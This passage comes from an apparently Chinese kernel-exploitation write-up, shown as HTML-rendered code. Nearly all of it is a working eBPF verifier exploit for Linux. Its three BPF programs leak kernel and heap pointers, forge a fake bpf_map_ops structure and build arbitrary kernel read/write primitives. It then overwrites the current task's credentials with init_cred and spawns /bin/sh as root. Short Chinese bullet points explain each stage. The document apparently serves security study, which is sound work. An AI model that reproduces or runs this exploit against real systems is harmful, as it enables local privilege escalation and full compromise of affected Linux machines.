</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">kleak_prog</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// load map_ptr_or_null in BPF_REG_0
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">oob_map_fd</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span> <span class="c1">// returns map_ptr + 0x110 (offset of .values in array_map)
</span></span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// map_ptr_or_null -&gt; map_ptr
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// trigger vuln and make eBPF think we are still map_ptr + 0x110 but in reality we&#39;re map_ptr + 0x0
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used hence any value can be used
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x110</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_RSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span> <span class="c1">// the bug
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// load the ptr (kbase leak)
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">),</span> <span class="c1">// map_ptr + 0x0 -&gt; map_ptr + 0xc0
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// load the ptr (heap leak)
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// write the read ptr to map for reading it from userspace
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">),</span> <span class="c1">// make map_ptr + 0xc0 to map_ptr + 0x110
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// write array_map_ops ptr to maps_ptr + 0x110
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span> <span class="c1">// write *(map_ptr + 0xc0) to maps_ptr + 0x118
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><ul>
<li>获取<code>oob_map</code>的<code>value</code>地址，在其中伪造<code>fake_ops</code>，主要写入<code>array_map_update_elem </code>、<code>ARRAY_MAP_LOOKUP_ELEM</code>、<code>array_of_map_gen_lookup</code>、<code>array_map_free</code></li>
<li>改<code>arb_read_write_map</code>的<code>ops</code>指向<code>fake_ops</code></li>
</ul>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">overwrite_ops</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">oob_map_fd</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// setup fake bpf_map_ops struct with only needed values
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span> <span class="c1">// move map_ptr + 0x110
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">ARRAY_MAP_UPDATE_ELEM_OFFSET</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">ARRAY_MAP_LOOKUP_ELEM_OFFSET</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x20e9c0</span><span class="p">),</span> <span class="c1">// array_of_map_gen_lookup
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">19</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x20eff0</span><span class="p">),</span> <span class="c1">// array_map_free
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">3</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">arb_read_write_map_fd</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span> <span class="c1">// get values ptr
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// trigger vuln
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x110</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_RSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_IMM64</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">map_ptr_values</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// overwrite map_ops with oob_map_ptr
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><ul>
<li>把<code>arb_read_write_map</code>的<code>value</code>地址存到r8，<code>info_map</code>的<code>value</code>地址存到r9</li>
<li>通过<code>BPF_LD_ABS(BPF_B, 0),</code>，根据接收到的数据是0还是1决定调用<code>arb_read</code>还是<code>arb_write</code>
<ul>
<li><code>arb_read</code>时：通过<code>arb_read</code>把要读的东西的地址写到<code>arb_read_write_map</code>中，再把这个地址写入<code>info_map</code>，通过<code>bpf_map_lookup_elem</code>（实际上执行的是<code>ARRAY_MAP_LOOKUP_ELEM</code>，会进行两次解引用）读这个地址中的内容，并返回</li>
<li><code>arb_write</code>时：在<code>arb_read_write_map</code>中写入存储<code>addr</code>的地址，<code>info_map</code>中写入存储值的地址，把<code>info_map</code>的值存入<code>arb_read_write_map</code>，通过<code>BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</code>执行<code>*addr(r8) = value(r7)</code></li>
</ul>
</li>
</ul>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">arb_read_write</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">arb_read_write_map_fd</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span> <span class="c1">// will use array_of_map_gen_lookup
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_ABS</span><span class="p">(</span><span class="n">BPF_B</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_9</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span> <span class="c1">// decide bit for arb_read or arb_write
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">info_map_fd</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JEQ</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// arb_read
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// arb_write
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">setup_bpf_prog</span><span class="p">(</span><span class="n">arb_read_write</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">arb_read_write</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">arb_read_write</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">current_task_struct</span> <span class="o">=</span> <span class="nf">arb_read</span><span class="p">(</span><span class="nf">arb_read</span><span class="p">(</span><span class="n">__per_cpu_offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">current_task</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">init_cred</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">INIT_CRED_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">arb_write</span><span class="p">(</span><span class="n">current_task_struct</span> <span class="o">+</span> <span class="n">CRED_OFFSET</span><span class="p">,</span> <span class="n">init_cred</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><h5 class="heading-element" id="exp"><span>exp</span>
  <a href="#exp" class="heading-mark">
